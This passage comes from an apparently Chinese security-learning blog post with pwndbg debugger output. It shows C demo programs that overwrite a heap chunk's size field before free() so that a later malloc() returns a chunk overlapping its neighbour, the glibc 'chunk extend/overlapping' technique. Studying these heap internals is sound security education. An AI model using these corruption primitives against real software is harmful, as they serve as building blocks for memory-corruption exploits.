class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info locals </span><br><span class="line">p = 0x602010</span><br><span class="line">q = 0x0</span><br><span class="line">pwndbg&gt; x/10gx 0x602020</span><br><span class="line">0x602020:0x00000000000000000x0000000000000021 &lt;=chunk1</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000020fc1 &lt;=top chunk</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>info local可以查看指针指向的地址，即user_data的起始地址</p><p>继续执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000021 &lt;=chunk1</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000021 &lt;=chunk2</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000020fc1 &lt;=top chunk</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20fc1</span><br><span class="line">&#125;</span><br><span class="line">0x602040 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135105, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>size = 33 = 0x21 = 0x8(prev_size) + 0x8(size) + 0x1(内容) + 0x1(标志位)</p><p>继续执行：<code>*(long long *)((long long)p - 0x8) = 0x41</code>后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000041</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000021</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000020fc1</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到chunk1的size 已经变为了0x41，也就是说chunk1的现在大小包含了原来的chunk1和chunk2的大小。</p><p>继续执行：free后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000041</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000021</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000020fc1</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x602000 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; info locals </span><br><span class="line">p = 0x602010</span><br><span class="line">q = 0x0</span><br></pre></td></tr></table></figure><p>这里虽然free了chunk1，但是内容并没有清空。</p><p>之后将chunk1（也就是合并之后的）放进了fastbin中。</p><p>继续执行：malloc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000041</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000021</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000020fc1</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; info bin</span><br><span class="line">Undefined info command: &quot;bin&quot;.  Try &quot;help info&quot;.</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; info locals </span><br><span class="line">p = 0x602010</span><br><span class="line">q = 0x602010</span><br></pre></td></tr></table></figure><p>malloc后的空间给了q，这样就可以通过新分配的chunk来对chunk2中的内容进行操作了，将这种状态称为overlapping chunk。</p><h3 id="示例2：对inuse的smallbin进行extend"><a href="#示例2：对inuse的smallbin进行extend" class="headerlink" title="示例2：对inuse的smallbin进行extend"></a>示例2：对inuse的smallbin进行extend</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line">    *(<span class="keyword">long</span> *)((<span class="keyword">long</span>)p<span class="number">-0x8</span>) = <span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/gwt/Desktop/a.out </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at 1.c:9</span><br><span class="line">9    *(long *)((long)p-0x8) = 0xb1;</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x6020c0 ◂— 0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffff7dd1b20 (main_arena) ◂— 0x100000000</span><br><span class="line"> RDX  0x6020c0 ◂— 0x0</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x6020d0 ◂— 0x0</span><br><span class="line"> R8   0x602000 ◂— 0x0</span><br><span class="line"> R9   0xd</span><br><span class="line"> R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x6020d0 ◂— 0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x400470 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffdf90 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffdeb0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdea0 —▸ 0x602010 ◂— 0x0</span><br><span class="line"> RIP  0x400590 (main+42) ◂— mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x400590 &lt;main+42&gt;    mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">   0x400594 &lt;main+46&gt;    sub    rax, 8</span><br><span class="line">   0x400598 &lt;main+50&gt;    mov    qword ptr [rax], 0xb1</span><br><span class="line">   0x40059f &lt;main+57&gt;    mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">   0x4005a3 &lt;main+61&gt;    mov    rdi, rax</span><br><span class="line">   0x4005a6 &lt;main+64&gt;    call   free@plt &lt;0x400430&gt;</span><br><span class="line"> </span><br><span class="line">   0x4005ab &lt;main+69&gt;    mov    edi, 0xa0</span><br><span class="line">   0x4005b0 &lt;main+74&gt;    call   malloc@plt &lt;0x400450&gt;</span><br><span class="line"> </span><br><span class="line">   0x4005b5 &lt;main+79&gt;    mov    qword ptr [rbp - 8], rax</span><br><span class="line">   0x4005b9 &lt;main+83&gt;    mov    eax, 0</span><br><span class="line">   0x4005be &lt;main+88&gt;    leave  </span><br><span class="line">───────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/gwt/Desktop/1.c</span><br><span class="line">    4 &#123;</span><br><span class="line">    5     void *p, *q;</span><br><span class="line">    6     p = malloc(0x80);//分配第一个 0x80 的chunk1</span><br><span class="line">    7     malloc(0x10); //分配第二个 0x10 的chunk2</span><br><span class="line">    8     malloc(0x10); //防止与top chunk合并</span><br><span class="line"> ►  9     *(long *)((long)p-0x8) = 0xb1;</span><br><span class="line">   10     free(p);</span><br><span class="line">   11     q = malloc(0xa0);</span><br><span class="line">   12 &#125;</span><br><span class="line">───────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdea0 —▸ 0x602010 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdea8 ◂— 0x0</span><br><span class="line">02:0010│ rbp  0x7fffffffdeb0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">03:0018│      0x7fffffffdeb8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">04:0020│      0x7fffffffdec0 ◂— 0x0</span><br><span class="line">05:0028│      0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe30e ◂— 0x77672f656d6f682f (&#x27;/home/gw&#x27;)</span><br><span class="line">06:0030│      0x7fffffffded0 ◂— 0x100000000</span><br><span class="line">07:0038│      0x7fffffffded8 —▸ 0x400566 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           400590 main+42</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint /home/gwt/Desktop/1.c:9</span><br><span class="line">pwndbg&gt; x/50gx 0x602000 </span><br><span class="line">0x602000:0x00000000000000000x0000000000000091 &lt;=chunk1</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000 &lt;=chunk1_end</span><br><span class="line">0x602090:0x00000000000000000x0000000000000021 &lt;=chunk2</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000021 &lt;=chunk3</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000020f31 &lt;=top_chunk</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>继续执行后和上一个示例一样，chunk1的大小变为了原来的chunk1+chunk2。</p><p>执行free：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x602000 </span><br><span class="line">0x602000:0x00000000000000000x00000000000000b1</span><br><span class="line">0x602010:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000021</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000b00x0000000000000020</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000020f31</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到chunk3 的size变为了0x20。free后的chunk1进入了unsortedbin，有两种情况下进入unsortedbin：</p><ul><li>  当一个较大的chunk被分割为两部分后，如果剩下的部分大于minsize，就会放入unsortedbin中。</li><li>  释放一个不属于fastbin的chunk，并且这个chunk不和top chunk紧邻时，这个chunk就会授信啊被放到unsortedbin中。</li></ul><p>这个例子就是上面的第二种情况，不属于fastbin，且不和top chunk紧邻。同样，之后的malloc后也可以达到对chunk2进行操作的目的。</p><h3 id="示例3：对-free-的-smallbin-进行-extend"><a href="#示例3：对-free-的-smallbin-进行-extend" class="headerlink" title="示例3：对 free 的 smallbin 进行 extend"></a>示例3：对 free 的 smallbin 进行 extend</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line">    *(<span class="keyword">long</span> *)((<span class="keyword">long</span>)p - <span class="number">0x8</span>) = <span class="number">0xb1</span>;</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行free后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/40gx  0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000091</span><br><span class="line">0x602010:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000900x0000000000000020</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000020f51</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>接下来执行：<code>*(long *)((long)p - 0x8) = 0xb1;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 